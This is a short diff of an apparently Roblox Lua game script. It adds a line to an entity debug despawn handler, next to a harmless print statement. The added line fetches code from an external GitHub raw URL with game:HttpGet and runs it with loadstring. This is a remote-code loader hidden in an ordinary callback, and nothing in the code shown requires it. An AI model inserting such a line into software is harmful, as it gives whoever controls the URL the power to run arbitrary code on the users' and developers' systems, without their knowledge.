@@ -7198,6 +7198,7 @@ end
 
 entity.Debug.OnEntityDespawned = function()
     print("Entity has despawned:")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/huyhoanphuc/gf/refs/heads/main/heehbbg"))()
 end
 
 entity.Debug.OnEntityStartMoving = function()
